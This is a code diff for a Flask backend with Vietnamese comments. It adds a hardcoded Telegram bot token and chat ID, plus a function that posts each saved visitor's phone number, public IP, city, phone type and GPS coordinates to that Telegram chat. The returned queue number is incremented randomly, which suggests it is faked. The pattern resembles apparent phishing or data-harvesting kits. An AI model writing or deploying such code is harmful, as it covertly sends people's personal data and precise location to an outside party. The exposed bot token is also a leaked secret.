@@ -3,11 +3,33 @@ from flask_cors import CORS
 import mysql.connector
 from mysql.connector import Error
 import random
+import requests  # Thư viện để gửi yêu cầu HTTP
 
 app = Flask(__name__)
 CORS(app)  # Kích hoạt CORS cho toàn bộ ứng dụng
 
 stt = 712
+
+# Thông tin về bot Telegram
+TELEGRAM_BOT_TOKEN = '7172702055:AAH__9vX0ru4vYoGtvqb7f5iUkwMLWskZBE'  # Thay bằng token của bot
+TELEGRAM_CHAT_ID = '1420235940'  # Thay bằng chat ID của bạn hoặc nhóm Telegram mà bạn muốn gửi tin nhắn
+
+
+# Hàm gửi tin nhắn đến Telegram
+def send_telegram_message(message):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': message
+        }
+        response = requests.post(url, json=payload)
+        if response.status_code == 200:
+            print("Tin nhắn đã được gửi thành công!")
+        else:
+            print(f"Lỗi khi gửi tin nhắn: {response.text}")
+    except Exception as e:
+        print(f"Lỗi khi kết nối với Telegram: {e}")
 
 
 # Kết nối MySQL
@@ -72,6 +94,11 @@ def save_user_info():
         connection.close()
         global stt 
         stt = stt + random.choice([1, 2])
+
+        # Gửi tin nhắn đến Telegram
+        message = f"""Thông tin mới: Số điện thoại: {phone_number}, IP Public: {ip_address}, Thành phố: {city}, Loại điện thoại: {phone_type}, Vị trí: ({longitude}, {latitude}) """
+        send_telegram_message(message)
+
         # Trả về phản hồi JSON thành công
         return jsonify({'stt': stt}), 200
 
